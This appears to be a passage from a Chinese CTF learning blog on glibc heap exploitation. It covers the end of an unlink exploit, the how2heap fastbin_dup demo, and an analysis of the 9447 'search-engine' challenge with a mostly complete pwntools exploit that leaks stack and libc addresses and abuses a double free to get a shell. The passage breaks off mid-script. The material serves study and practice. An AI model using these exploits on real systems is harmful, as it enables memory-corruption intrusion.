class="line">heap_ptr = 0x6020d0 #堆指针</span><br><span class="line">#准备unlink，在chunk1中伪造chunk</span><br><span class="line">payload = p64(0) + p64(0x21)</span><br><span class="line">payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)</span><br><span class="line">payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_size</span><br><span class="line">add(1, payload)</span><br><span class="line">#此时chunk2的inuse位是0，所以触发unlink</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[&apos;free&apos;]</span><br><span class="line">atoi_got = elf.got[&apos;atoi&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">puts = elf.symbols[&apos;puts&apos;]</span><br><span class="line">system_off = libc.symbols[&apos;system&apos;]</span><br><span class="line">atoi_off = libc.symbols[&apos;atoi&apos;]</span><br><span class="line"></span><br><span class="line">#unlink后 堆指针被修改，向现在指针所指内存写入数据</span><br><span class="line">#将chunk2指针覆盖为atoi_got</span><br><span class="line">#将chunk3指针覆盖为puts_got</span><br><span class="line">#将chunk1指针覆盖为free_got</span><br><span class="line">payload = p64(0) + p64(atoi_got)</span><br><span class="line">payload += p64(puts_got) + p64(free_got)</span><br><span class="line">update(1, payload)</span><br><span class="line">#再次向chunk1写入，相当于向free_got写入</span><br><span class="line">#这里将free_got写为puts</span><br><span class="line">update(1, p64(puts))</span><br><span class="line"></span><br><span class="line">#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)</span><br><span class="line">#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址</span><br><span class="line">#由此可计算出libc_base</span><br><span class="line">delete(2)</span><br><span class="line">libc_base = u64(p.recv(6) + &apos;\x00\x00&apos;) - atoi_off#通过调试发现，这里只能取6个字节</span><br><span class="line">print &quot;libc_base : %#x&quot; % libc_base </span><br><span class="line">system = libc_base + system_off</span><br><span class="line"></span><br><span class="line">#将free的got表写为system</span><br><span class="line">update(1, p64(system))</span><br><span class="line">#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数</span><br><span class="line">add(2, &apos;/bin/sh\x00&apos;)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.1-fastbin_dup</title>
      <link href="/2018/10/15/introduction-to-pwn2-1-fastbin-dup/"/>
      <url>/2018/10/15/introduction-to-pwn2-1-fastbin-dup/</url>
      <content type="html"><![CDATA[<p><em>尽量去有秩序的入门堆。。。但大部分堆看起来都太痛苦了。。</em></p><h1 id="fastbin-dup原理"><a href="#fastbin-dup原理" class="headerlink" title="fastbin_dup原理"></a>fastbin_dup原理</h1><p>利用堆对fastbin的管理特性，当chunk在fastbin的表头时，再次释放会触发检测机制，防止double free，但是若不在表头，便不会有这个问题。<br>产生这种结果的原因是： fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p><p>可以用how2heap的例子来理解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br><span class="line">       &quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;);</span><br><span class="line"></span><br><span class="line">unsigned long long stack_var;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">int *a = malloc(8);</span><br><span class="line">int *b = malloc(8);</span><br><span class="line">int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">// free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);</span><br><span class="line">free(b);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br><span class="line">&quot;We&apos;ll now carry out our attack by modifying data at %p.\n&quot;, a, b, a, a);</span><br><span class="line">unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, d);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p ].\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br><span class="line">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br><span class="line">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br><span class="line">&quot;return a pointer to it.\n&quot;, a);</span><br><span class="line">stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</span><br><span class="line">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;4th malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> ./fastbin_dup_into_stack </span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7ffe1abfa870.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x56317e17e260</span><br><span class="line">2nd malloc(8): 0x56317e17e280</span><br><span class="line">3rd malloc(8): 0x56317e17e2a0</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x56317e17e260 again, things will crash because 0x56317e17e260 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0x56317e17e280.</span><br><span class="line">Now, we can free 0x56317e17e260 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x56317e17e260, 0x56317e17e280, 0x56317e17e260 ]. We&apos;ll now carry out our attack by modifying data at 0x56317e17e260.</span><br><span class="line">1st malloc(8): 0x56317e17e260</span><br><span class="line">2nd malloc(8): 0x56317e17e280</span><br><span class="line">Now the free list has [ 0x56317e17e260 ].</span><br><span class="line">Now, we have access to 0x56317e17e260 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x56317e17e260 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x56317e17e260, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7ffe1abfa860</span><br></pre></td></tr></table></figure><p>可以看出1st malloc分配的内存被分配了两次，这样就可以修改其fd指针来控制分配的chunk的位置，例如chunk4就被分配到了栈里。</p><h1 id="例题-9447-search-engine"><a href="#例题-9447-search-engine" class="headerlink" title="例题-9447-search-engine"></a>例题-9447-search-engine</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>程序给出了三个选项。2可以输入一个自己指定长度的句子，然后可以用1来索引2中句子的单词，索引到之后可以选择是否删除该句子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1: Search with a word&quot;);</span><br><span class="line">  puts(&quot;2: Index a sentence&quot;);</span><br><span class="line">  return puts(&quot;3: Quit&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>inde a sentence.程序写的很复杂，看起来很揪心。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">int index_a_sentence()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  __int64 v1; // rbp</span><br><span class="line">  int v2; // er13</span><br><span class="line">  char *v3; // r12</span><br><span class="line">  signed __int64 v4; // rbx</span><br><span class="line">  signed __int64 v5; // rbp</span><br><span class="line">  _DWORD *v6; // rax</span><br><span class="line">  int v7; // edx</span><br><span class="line">  __int64 v8; // rdx</span><br><span class="line">  __int64 v10; // rdx</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter the sentence size:&quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  v1 = (unsigned int)(v0 - 1);</span><br><span class="line">  v2 = v0;</span><br><span class="line">  if ( (unsigned int)v1 &gt; 0xFFFD )</span><br><span class="line">    puts_(&quot;Invalid size&quot;);</span><br><span class="line">  puts(&quot;Enter the sentence:&quot;);</span><br><span class="line">  v3 = (char *)malloc(v2);</span><br><span class="line">  read_until_newline((__int64)v3, v2, 0);</span><br><span class="line">  v4 = (signed __int64)(v3 + 1);</span><br><span class="line">  v5 = (signed __int64)&amp;v3[v1 + 2];</span><br><span class="line">  v6 = malloc(0x28uLL);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  *(_QWORD *)v6 = v3;</span><br><span class="line">  v6[2] = 0;</span><br><span class="line">  *((_QWORD *)v6 + 2) = v3;</span><br><span class="line">  v6[6] = v2;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    while ( *(_BYTE *)(v4 - 1) != 32 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[2] = ++v7;</span><br><span class="line">LABEL_4:</span><br><span class="line">      if ( ++v4 == v5 )</span><br><span class="line">        goto LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = qword_6020B8;</span><br><span class="line">      qword_6020B8 = (__int64)v6;</span><br><span class="line">      *((_QWORD *)v6 + 4) = v10;</span><br><span class="line">      v6 = malloc(0x28uLL);</span><br><span class="line">      v7 = 0;</span><br><span class="line">      *(_QWORD *)v6 = v4;</span><br><span class="line">      v6[2] = 0;</span><br><span class="line">      *((_QWORD *)v6 + 2) = v3;</span><br><span class="line">      v6[6] = v2;</span><br><span class="line">      goto LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)v6 = v4++;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 != v5 );</span><br><span class="line">LABEL_8:</span><br><span class="line">  if ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = qword_6020B8;</span><br><span class="line">    qword_6020B8 = (__int64)v6;</span><br><span class="line">    *((_QWORD *)v6 + 4) = v8;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    free(v6);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Added sentence&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>search word：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">void search_with_a_word()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ebp</span><br><span class="line">  void *v1; // r12</span><br><span class="line">  __int64 i; // rbx</span><br><span class="line">  char v3; // [rsp+0h] [rbp-38h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter the word size:&quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  if ( (unsigned int)(v0 - 1) &gt; 0xFFFD )</span><br><span class="line">    puts_(&quot;Invalid size&quot;);</span><br><span class="line">  puts(&quot;Enter the word:&quot;);</span><br><span class="line">  v1 = malloc(v0);</span><br><span class="line">  read_until_newline((__int64)v1, v0, 0);</span><br><span class="line">  for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( **(_BYTE **)(i + 16) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(_DWORD *)(i + 8) == v0 &amp;&amp; !memcmp(*(const void **)i, v1, v0) )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(1LL, &quot;Found %d: &quot;, *(unsigned int *)(i + 24));</span><br><span class="line">        fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout);</span><br><span class="line">        putchar(10);</span><br><span class="line">        puts(&quot;Delete this sentence (y/n)?&quot;);</span><br><span class="line">        read_until_newline((__int64)&amp;v3, 2, 1);</span><br><span class="line">        if ( v3 == 121 )</span><br><span class="line">        &#123;</span><br><span class="line">          memset(*(void **)(i + 16), 0, *(signed int *)(i + 24));</span><br><span class="line">          free(*(void **)(i + 16));</span><br><span class="line">          puts(&quot;Deleted!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  free(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_num：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 get_num()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  char *endptr; // [rsp+8h] [rbp-50h]</span><br><span class="line">  char nptr; // [rsp+10h] [rbp-48h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+48h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  read_until_newline((__int64)&amp;nptr, 48, 1);</span><br><span class="line">  result = strtol(&amp;nptr, &amp;endptr, 0);</span><br><span class="line">  if ( endptr == &amp;nptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(1LL, &quot;%s is not a valid number\n&quot;, &amp;nptr);</span><br><span class="line">    result = get_num();</span><br><span class="line">  &#125;</span><br><span class="line">  __readfsqword(0x28u);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>get_num这个函数本身有漏洞，它将输入的最大48位字符串转化为数字，但是问题就是在确定字符串时是以结尾的null来判断的，<br>所以我们如果输入48个字符的话，在报错时可能会将之后的栈内存打印出来从而泄露栈地址。</p><p>整个过程大概是以一个结构体来保存每个单词：(40个字节)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct words_struct </span><br><span class="line">&#123; </span><br><span class="line">  addr* words_str; //单词字符串的起始位置(其实是在句子字符串当中的) </span><br><span class="line">  int64_t size; // 单词大小 </span><br><span class="line">  addr* ptr_to_sentences; //单词所在的句子字符串的位置 </span><br><span class="line">  int64_t* size_of_sentences;//句子长度 </span><br><span class="line">  words_struct* next_word;//链表下一个节点指针 </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在删除句子时，是将word_struct中ptr_to_sentences所指向的句子释放，但未置为null。<br>在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 \x00 ，由于单词结构体中存储的单词只是句子的一个指针，<br>所以单词也会被置为 \x00 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。<br>看起来由于句子内容被置为 \x00 可以防止通过 *i-&gt;sentence_ptr 验证。然而，由于 chunk 被释放后会被放到 bin 中，<br>当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。<br>此外，当句子被 memset 的时候，单词虽然都变为了 \x00 ，但是我们仍然可以通过两个 \x00 的比较来绕过 memcmp 的检测。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>1) 利用get_num函数的漏洞试图泄露栈地址<br>2) 泄露libc_address，从而计算出system 和 /bin/sh的地址<br>3) 利用fastbin_dup 进行double free<br>4) 利用double free来覆盖栈中的返回地址控制程序执行system(“/bin/sh”)</p><p><em>思路大抵如此，但是借鉴大佬的exp却都无法正常得到shell，不晓得哪里有问题，或许是环境不一样</em></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>先附上大佬写的exp，再多捋一捋思路，调试调试，去找到问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line"></span><br><span class="line">p = process(&apos;./search-bf61fbb8fa7212c814b2607a81a84adf&apos;)</span><br><span class="line"></span><br><span class="line"># binsh_offset 找不到</span><br><span class="line">pop_rdi_ret = 0x400e23</span><br><span class="line">system_offset = 0x46590</span><br><span class="line">puts_offset = 0x6fd60</span><br><span class="line">binsh_offset = 1558723</span><br><span class="line"></span><br><span class="line">def leak_stack():</span><br><span class="line">    p.sendline(&apos;A&apos;*48)</span><br><span class="line">    p.recvuntil(&apos;Quit\n&apos;)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    # doesn&apos;t work all the time</span><br><span class="line">    p.sendline(&apos;A&apos;*48)</span><br><span class="line">    leak = p.recvline().split(&apos; &apos;)[0][48:]</span><br><span class="line">    return int(leak[::-1].encode(&apos;hex&apos;), 16)</span><br><span class="line"></span><br><span class="line">def leak_libc():</span><br><span class="line">    # this sentence is the same size as a list node</span><br><span class="line">    index_sentence((&apos;a&apos;*12 + &apos; b &apos;).ljust(40, &apos;c&apos;))</span><br><span class="line"></span><br><span class="line">    # delete the sentence</span><br><span class="line">    search(&apos;a&apos; * 12)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">    # the node for this sentence gets put in the previous sentence&apos;s spot.</span><br><span class="line">    # note we made sure this doesn&apos;t reuse the chunk that was just freed by</span><br><span class="line">    # making it 64 bytes</span><br><span class="line">    index_sentence(&apos;d&apos; * 64)</span><br><span class="line"></span><br><span class="line">    # free the first sentence again so we can allocate something on top of it.</span><br><span class="line">    # this will work because 1) the sentence no longer starts with a null byte</span><br><span class="line">    # (in fact, it should be clear that it starts a pointer to 64 d&apos;s), and 2)</span><br><span class="line">    # the location where our original string contained `b` is guaranteed to be</span><br><span class="line">    # zero. this is because after the original sentence was zeroed out, nothing</span><br><span class="line">    # was allocated at offset 12, which is just padding in the structure. if</span><br><span class="line">    # we had made the first word in the string 16 bytes instead of 12, then that</span><br><span class="line">    # would put &apos;b&apos; at a location where it would not be guaranteed to be zero.</span><br><span class="line">    search(&apos;\x00&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">    # make our fake node</span><br><span class="line">    node = &apos;&apos;</span><br><span class="line">    node += p64(0x400E90) # word pointer &quot;Enter&quot;</span><br><span class="line">    node += p64(5) # word length</span><br><span class="line">    node += p64(0x602028) # sentence pointer (GOT address of free)</span><br><span class="line">    node += p64(64) # length of sentence</span><br><span class="line">    node += p64(0x00000000) # next pointer is null</span><br><span class="line">    assert len(node) == 40</span><br><span class="line"></span><br><span class="line">    # this sentence gets allocated on top of the previous sentence&apos;s node.</span><br><span class="line">    # we can thus control the sentence pointer of that node and leak memory.</span><br><span class="line">    index_sentence(node)</span><br><span class="line"></span><br><span class="line">    # this simply receives all input from the binary and discards it, which</span><br><span class="line">    # makes parsing out the leaked address easier below.</span><br><span class="line">    p.clean()</span><br><span class="line"></span><br><span class="line">    # leak the libc address</span><br><span class="line">    search(&apos;Enter&apos;)</span><br><span class="line">    p.recvuntil(&apos;Found 64: &apos;)</span><br><span class="line">    leak = u64(p.recvline()[:8])</span><br><span class="line">    p.sendline(&apos;n&apos;) # deleting it isn&apos;t necessary</span><br><span class="line">    return leak</span><br><span class="line"></span><br><span class="line">def index_sentence(s):</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def search(s):</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def make_cycle():</span><br><span class="line">    index_sentence(&apos;a&apos;*54 + &apos; d&apos;)</span><br><span class="line">    index_sentence(&apos;b&apos;*54 + &apos; d&apos;)</span><br><span class="line">    index_sentence(&apos;c&apos;*54 + &apos; d&apos;)</span><br><span class="line"></span><br><span class="line">    search(&apos;d&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    search(&apos;\x00&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;n&apos;)</span><br><span class="line"></span><br><span class="line">def make_fake_chunk(addr):</span><br><span class="line">    # set the fwd pointer of the chunk to the address we want</span><br><span class="line">    fake_chunk = p64(addr)</span><br><span class="line">    index_sentence(fake_chunk.ljust(56))</span><br><span class="line"></span><br><span class="line">def 